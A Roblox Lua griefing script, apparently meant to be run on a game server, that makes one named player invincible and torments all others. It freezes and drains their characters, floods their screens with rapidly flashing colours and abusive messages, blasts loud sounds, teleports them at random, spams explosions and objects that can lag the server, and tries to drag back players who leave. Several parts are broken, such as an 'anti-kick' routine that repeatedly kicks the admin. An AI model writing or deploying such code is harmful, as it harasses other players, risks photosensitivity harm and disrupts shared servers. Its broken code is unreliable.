local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local TeleportService = game:GetService("TeleportService")
local targetName = "lqrb0x"
local adminPlayer = nil
local chaosEnabled = true
local skyboxIds = {
    264909758, 5772456607, 2529729649, 271042516, 582716713, 
    1837639518, 3257149641, 1420988951, 271042516, 264909758
}

local function findAdmin()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == targetName then
            adminPlayer = player
            return true
        end
    end
    return false
end

local function makeAdminGod(player)
    if player ~= adminPlayer then return end
    
    spawn(function()
        while player and player.Parent and chaosEnabled do
            if player.Character then
                local humanoid = player.Character:FindFirstChildWhichIsA("Humanoid")
                if humanoid then
                    humanoid.MaxHealth = math.huge
                    humanoid.Health = math.huge
                    humanoid.WalkSpeed = 100
                    humanoid.JumpPower = 200
                    humanoid.Name = "GOD_MODE_LQRB0X"
                    
                    for _, part in ipairs(player.Character:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                            part.BrickColor = BrickColor.new("Bright yellow")
                            part.Material = Enum.Material.Neon
                            
                            local light = Instance.new("PointLight")
                            light.Brightness = 10
                            light.Range = 50
                            light.Color = Color3.new(1, 1, 0)
                            light.Parent = part
                        end
                    end
                    
                    local head = player.Character:FindFirstChild("Head")
                    if head then
                        local billboard = Instance.new("BillboardGui")
                        billboard.Size = UDim2.new(0, 500, 0, 150)
                        billboard.StudsOffset = Vector3.new(0, 10, 0)
                        billboard.AlwaysOnTop = true
                        billboard.Parent = head
                        
                        local label = Instance.new("TextLabel")
                        label.Size = UDim2.new(1, 0, 1, 0)
                        label.BackgroundTransparency = 1
                        label.Text = "👑 LQRB0X - GOD MODE 👑"
                        label.TextColor3 = Color3.new(1, 1, 0)
                        label.Font = Enum.Font.GothamBlack
                        label.TextSize = 30
                        label.TextStrokeColor3 = Color3.new(0, 0, 0)
                        label.TextStrokeTransparency = 0
                        label.Parent = billboard
                    end
                end
            end
            wait(0.1)
        end
    end)
end

local function applyUltimateChaos(player)
    if player == adminPlayer then return end
    if not chaosEnabled then return end
    
    spawn(function()
        while player and player.Parent and chaosEnabled do
            if player.Character then
                local char = player.Character
                
                for _, part in ipairs(char:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.BrickColor = BrickColor.new("Really black")
                        part.Material = Enum.Material.Neon
                        part.Reflectance = 1
                        part.Transparency = 0.7
                        part.CanCollide = false
                        
                        local fire = Instance.new("Fire")
                        fire.Size = 15
                        fire.Heat = 25
                        fire.Color = Color3.new(1, 0, 0)
                        fire.SecondaryColor = Color3.new(1, 0, 1)
                        fire.Parent = part
                        
                        local smoke = Instance.new("Smoke")
                        smoke.Size = 0.5
                        smoke.Opacity = 1
                        smoke.Color = Color3.new(0, 0, 0)
                        smoke.RiseVelocity = 10
                        smoke.Parent = part
                        
                        local sparkles = Instance.new("Sparkles")
                        sparkles.SparkleColor = Color3.new(1, 0, 0)
                        sparkles.Parent = part
                        
                        local light = Instance.new("PointLight")
                        light.Brightness = 8
                        light.Range = 25
                        light.Color = Color3.new(1, 0, 0)
                        light.Parent = part
                    end
                end
                
                local humanoid = char:FindFirstChildWhichIsA("Humanoid")
                if humanoid then
                    humanoid.WalkSpeed = 0
                    humanoid.JumpPower = 0
                    humanoid.MaxHealth = 1
                    humanoid.Health = 0.5
                    humanoid.AutoRotate = false
                    humanoid.PlatformStand = true
                    humanoid.Name = "CHAOS_VICTIM_" .. player.Name
                    
                    spawn(function()
                        while humanoid and humanoid.Parent do
                            humanoid:TakeDamage(0.1)
                            wait(0.05)
                        end
                    end)
                end
                
                local head = char:FindFirstChild("Head")
                if head then
                    local billboard = Instance.new("BillboardGui")
                    billboard.Name = "CHAOS_BILLBOARD"
                    billboard.Size = UDim2.new(0, 400, 0, 120)
                    billboard.StudsOffset = Vector3.new(0, 12, 0)
                    billboard.AlwaysOnTop = true
                    billboard.Parent = head
                    
                    local label = Instance.new("TextLabel")
                    label.Size = UDim2.new(1, 0, 1, 0)
                    label.BackgroundTransparency = 1
                    label.Text = "LQRB0X OWNS YOU\nCAN'T ESCAPE - CAN'T RESET"
                    label.TextColor3 = Color3.new(1, 0, 0)
                    label.Font = Enum.Font.GothamBlack
                    label.TextSize = 18
                    label.TextStrokeTransparency = 0
                    label.TextStrokeColor3 = Color3.new(0, 0, 0)
                    label.TextStrokeThickness = 3
                    label.Parent = billboard
                end
                
                if adminPlayer and adminPlayer.Character then
                    local adminHrp = adminPlayer.Character:FindFirstChild("HumanoidRootPart")
                    local playerHrp = char:FindFirstChild("HumanoidRootPart")
                    
                    if adminHrp and playerHrp then
                        playerHrp.CFrame = adminHrp.CFrame + Vector3.new(
                            math.random(-20, 20),
                            math.random(-5, 10),
                            math.random(-20, 20)
                        )
                    end
                end
            end
            wait(0.01)
        end
    end)
end

local function megaExplosionStorm()
    while chaosEnabled do
        if adminPlayer and adminPlayer.Character then
            local adminHrp = adminPlayer.Character:FindFirstChild("HumanoidRootPart")
            if adminHrp then
                for i = 1, 50 do
                    local explosion = Instance.new("Explosion")
                    explosion.Position = adminHrp.Position + Vector3.new(
                        math.random(-100, 100),
                        math.random(-50, 50),
                        math.random(-100, 100)
                    )
                    explosion.BlastPressure = 5000000
                    explosion.BlastRadius = 30
                    explosion.DestroyJointRadiusPercent = 100
                    explosion.ExplosionType = Enum.ExplosionType.Craters
                    explosion.Parent = Workspace
                    
                    local fire = Instance.new("Fire")
                    fire.Size = 25
                    fire.Heat = 50
                    fire.Parent = Workspace
                    fire.Position = explosion.Position
                    
                    local smoke = Instance.new("Smoke")
                    smoke.Size = 1
                    smoke.Opacity = 1
                    smoke.Parent = Workspace
                    smoke.Position = explosion.Position
                end
            end
        end
        wait(0.2)
    end
end

local function insaneSkyboxChaos()
    while chaosEnabled do
        local sky = Instance.new("Sky")
        sky.SkyboxBk = "rbxassetid://" .. skyboxIds[math.random(1, #skyboxIds)]
        sky.SkyboxDn = "rbxassetid://" .. skyboxIds[math.random(1, #skyboxIds)]
        sky.SkyboxFt = "rbxassetid://" .. skyboxIds[math.random(1, #skyboxIds)]
        sky.SkyboxLf = "rbxassetid://" .. skyboxIds[math.random(1, #skyboxIds)]
        sky.SkyboxRt = "rbxassetid://" .. skyboxIds[math.random(1, #skyboxIds)]
        sky.SkyboxUp = "rbxassetid://" .. skyboxIds[math.random(1, #skyboxIds)]
        sky.Parent = Lighting
        
        wait(0.3)
        
        for _, skyObj in ipairs(Lighting:GetChildren()) do
            if skyObj:IsA("Sky") then
                skyObj:Destroy()
            end
        end
    end
end

local function decalSpamApocalypse()
    while chaosEnabled do
        for _, part in ipairs(Workspace:GetChildren()) do
            if part:IsA("BasePart") and math.random(1, 10) == 1 then
                for i = 1, 6 do
                    local decal = Instance.new("Decal")
                    decal.Face = Enum.NormalId[{"Top", "Bottom", "Left", "Right", "Front", "Back"}[i]]
                    decal.Texture = "rbxassetid://" .. math.random(1000000, 9999999)
                    decal.Color3 = Color3.new(math.random(), math.random(), math.random())
                    decal.Transparency = math.random(0, 0.7)
                    decal.Parent = part
                    game:GetService("Debris"):AddItem(decal, 3)
                end
            end
        end
        
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= adminPlayer and player.Character then
                for _, part in ipairs(player.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        for i = 1, 6 do
                            local decal = Instance.new("Decal")
                            decal.Face = Enum.NormalId[{"Top", "Bottom", "Left", "Right", "Front", "Back"}[i]]
                            decal.Texture = "rbxassetid://" .. math.random(1000000, 9999999)
                            decal.Color3 = Color3.new(math.random(), math.random(), math.random())
                            decal.Transparency = math.random(0, 0.5)
                            decal.Parent = part
                            game:GetService("Debris"):AddItem(decal, 2)
                        end
                    end
                end
            end
        end
        wait(0.1)
    end
end

local function ultraLightingChaos()
    while chaosEnabled do
        Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
        Lighting.Brightness = math.random(0.1, 20)
        Lighting.FogColor = Color3.new(math.random(), math.random(), math.random())
        Lighting.FogEnd = math.random(1, 1000)
        Lighting.FogStart = 0
        Lighting.GlobalShadows = math.random(1, 10) > 5
        Lighting.OutdoorAmbient = Color3.new(math.random(), math.random(), math.random())
        Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
        Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
        Lighting.ExposureCompensation = math.random(-5, 5)
        Lighting.GeographicLatitude = math.random(-90, 90)
        Lighting.TimeOfDay = string.format("%02d:%02d", math.random(0, 23), math.random(0, 59))
        wait(0.03)
    end
end

local function screenTorture()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= adminPlayer then
            local gui = player:FindFirstChild("PlayerGui")
            if gui then
                local screenGui = Instance.new("ScreenGui")
                screenGui.Name = "TORTURE_SCREEN"
                screenGui.ResetOnSpawn = false
                screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.BackgroundColor3 = Color3.new(0, 0, 0)
                frame.BackgroundTransparency = 0
                frame.Parent = screenGui
                
                local labels = {}
                local messages = {
                    "LQRB0X OWNS YOU",
                    "CAN'T ESCAPE",
                    "CAN'T RESET",
                    "CAN'T QUIT",
                    "CAN'T HIDE",
                    "CAN'T RUN",
                    "CAN'T WIN",
                    "CAN'T LEAVE",
                    "CAN'T STOP",
                    "CAN'T BREATHE",
                    "CAN'T THINK",
                    "CAN'T SURVIVE",
                    "CAN'T EXIST",
                    "CAN'T LIVE",
                    "CAN'T DIE",
                    "CAN'T ESCAPE LQRB0X",
                    "CHAOS FOREVER",
                    "SUFFER MORE",
                    "PAIN CONTINUES",
                    "ENDLESS TORMENT"
                }
                
                for i = 1, 20 do
                    local label = Instance.new("TextLabel")
                    label.Size = UDim2.new(0.3, 0, 0.05, 0)
                    label.Position = UDim2.new(math.random(), 0, math.random(), 0)
                    label.BackgroundTransparency = 1
                    label.Text = messages[math.random(1, #messages)]
                    label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
                    label.Font = Enum.Font.GothamBlack
                    label.TextSize = math.random(14, 24)
                    label.TextStrokeTransparency = 0
                    label.TextStrokeColor3 = Color3.new(0, 0, 0)
                    label.Parent = screenGui
                    table.insert(labels, label)
                end
                
                spawn(function()
                    while screenGui and screenGui.Parent do
                        frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
                        frame.BackgroundTransparency = math.random(0, 0.8)
                        
                        for _, label in ipairs(labels) do
                            label.Position = UDim2.new(math.random(), 0, math.random(), 0)
                            label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
                            label.Text = messages[math.random(1, #messages)]
                            label.TextSize = math.random(14, 28)
                            label.Rotation = math.random(-15, 15)
                        end
                        wait(0.1)
                    end
                end)
                
                screenGui.Parent = gui
            end
        end
    end
end

local function preventLeaving()
    Players.PlayerRemoving:Connect(function(player)
        if player ~= adminPlayer and chaosEnabled then
            wait(0.1)
            
            local success, placeId = pcall(function()
                return game.PlaceId
            end)
            
            if success then
                spawn(function()
                    pcall(function()
                        TeleportService:Teleport(placeId, player)
                    end)
                end)
            end
        end
    end)
end

local function antiKickForAdmin()
    if not adminPlayer then return end
    
    spawn(function()
        while adminPlayer and adminPlayer.Parent and chaosEnabled do
            pcall(function()
                if adminPlayer then
                    adminPlayer:Kick("")
                end
            end)
            wait(0.1)
        end
    end)
end

local function soundHell()
    local hellSounds = {
        "rbxassetid://9118462711",
        "rbxassetid://27697743",
        "rbxassetid://142376088",
        "rbxassetid://184702870",
        "rbxassetid://2800812159",
        "rbxassetid://131973686",
        "rbxassetid://130779767",
        "rbxassetid://2767090",
        "rbxassetid://3655485930",
        "rbxassetid://3655485057"
    }
    
    while chaosEnabled do
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= adminPlayer then
                spawn(function()
                    for i = 1, 5 do
                        if player and player.Character then
                            local head = player.Character:FindFirstChild("Head")
                            if head then
                                local sound = Instance.new("Sound")
                                sound.SoundId = hellSounds[math.random(1, #hellSounds)]
                                sound.Volume = 5
                                sound.Parent = head
                                sound:Play()
                                game:GetService("Debris"):AddItem(sound, 10)
                            end
                        end
                        wait(0.1)
                    end
                end)
            end
        end
        wait(0.5)
    end
end

local function gravityInversion()
    while chaosEnabled do
        Workspace.Gravity = math.random(-500, 500)
        wait(0.5)
    end
end

local function spamChatWithEffects()
    while chaosEnabled do
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= adminPlayer then
                local gui = player:FindFirstChild("PlayerGui")
                if gui then
                    local messages = {
                        "🔥 LQRB0X 🔥",
                        "💀 YOU'RE TRAPPED 💀",
                        "☠ NO ESCAPE ☠",
                        "👹 SUFFER 👹",
                        "👿 CHAOS REIGNS 👿",
                        "🤡 YOU'RE A CLOWN 🤡",
                        "💩 GET REKT 💩",
                        "☣ TOXIC CHAOS ☣",
                        "⚡ ELECTRIFIED ⚡",
                        "🌋 VOLCANIC RAGE 🌋"
                    }
                    
                    local msg = Instance.new("Message")
                    msg.Text = messages[math.random(1, #messages)]
                    msg.Parent = gui
                    game:GetService("Debris"):AddItem(msg, 1)
                end
            end
        end
        wait(0.2)
    end
end

local function randomTeleportHell()
    while chaosEnabled do
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= adminPlayer and player.Character then
                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.CFrame = CFrame.new(
                        math.random(-9999, 9999),
                        math.random(-999, 9999),
                        math.random(-9999, 9999)
                    ) * CFrame.Angles(
                        math.rad(math.random(0, 360)),
                        math.rad(math.random(0, 360)),
                        math.rad(math.random(0, 360))
                    )
                end
            end
        end
        wait(0.3)
    end
end

local function objectSpamArmageddon()
    while chaosEnabled do
        for i = 1, 100 do
            local part = Instance.new("Part")
            part.Shape = Enum.PartType[{"Block", "Ball", "Cylinder"}[math.random(1, 3)]]
            part.Size = Vector3.new(
                math.random(1, 50),
                math.random(1, 50),
                math.random(1, 50)
            )
            part.Position = Vector3.new(
                math.random(-1000, 1000),
                math.random(-500, 1000),
                math.random(-1000, 1000)
            )
            part.BrickColor = BrickColor.random()
            part.Material = Enum.Material.Neon
            part.Reflectance = math.random()
            part.Transparency = math.random()
            part.Anchored = false
            part.CanCollide = true
            part.Parent = Workspace
            
            local velocity = Instance.new("BodyVelocity")
            velocity.Velocity = Vector3.new(
                math.random(-1000, 1000),
                math.random(-1000, 1000),
                math.random(-1000, 1000)
            )
            velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            velocity.Parent = part
            
            local gyro = Instance.new("BodyGyro")
            gyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
            gyro.P = 100000
            gyro.D = 10000
            gyro.Parent = part
            
            game:GetService("Debris"):AddItem(part, 5)
        end
        wait(0.1)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player.Name == targetName then
        adminPlayer = player
        makeAdminGod(player)
    else
        wait(1)
        applyUltimateChaos(player)
    end
end)

for _, player in ipairs(Players:GetPlayers()) do
    if player.Name == targetName then
        adminPlayer = player
        makeAdminGod(player)
    else
        applyUltimateChaos(player)
    end
end

wait(2)

spawn(megaExplosionStorm)
spawn(insaneSkyboxChaos)
spawn(decalSpamApocalypse)
spawn(ultraLightingChaos)
spawn(screenTorture)
spawn(preventLeaving)
spawn(antiKickForAdmin)
spawn(soundHell)
spawn(gravityInversion)
spawn(spamChatWithEffects)
spawn(randomTeleportHell)
spawn(objectSpamArmageddon)

print("=" .. string.rep("=", 50))
print("ULTIMATE CHAOS ACTIVATED BY LQRB0X")
print("GOD MODE: ACTIVE FOR LQRB0X")
print("CHAOS MODE: MAXIMUM FOR OTHERS")
print("ANTI-LEAVE: ACTIVE")
print("ANTI-KICK: ACTIVE FOR LQRB0X")
print("=" .. string.rep("=", 50))

while true do
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= adminPlayer then
            applyUltimateChaos(player)
        end
    end
    wait(0.01)
end